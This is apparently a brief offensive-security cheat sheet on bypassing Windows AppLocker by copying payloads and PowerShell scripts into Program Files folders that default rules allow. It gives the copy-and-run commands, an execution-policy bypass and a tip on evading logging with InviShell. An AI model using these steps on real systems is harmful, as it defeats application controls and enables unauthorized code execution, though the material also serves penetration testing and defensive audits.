# AppLocker Bypass (Program Files Gap)

Default AppLocker rules allow execution from `%PROGRAMFILES%\*` for all users. Copy scripts/executables there to bypass.

## Default Rule Gap
AppLocker default: `Everyone` can run anything from `C:\Program Files\` and `C:\Program Files (x86)\`.

## Bypass
```powershell
# Copy payload to Program Files (writable if you have write access or use subdirs created by installers)
copy payload.exe "C:\Program Files\SomeApp\payload.exe"
"C:\Program Files\SomeApp\payload.exe"
```

## Execute PowerShell Scripts via the Gap
```powershell
# Copy PS1 to allowed path and run
copy script.ps1 "C:\Program Files\Windows NT\script.ps1"
powershell -ExecutionPolicy Bypass -File "C:\Program Files\Windows NT\script.ps1"
```

## Check AppLocker Policy
```powershell
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

## Notes
- Works when script execution is blocked but `%PROGRAMFILES%` rule applies to scripts too
- Combine with InviShell to bypass logging if needed
- Alternative: WDAC (Windows Defender Application Control) is harder to bypass
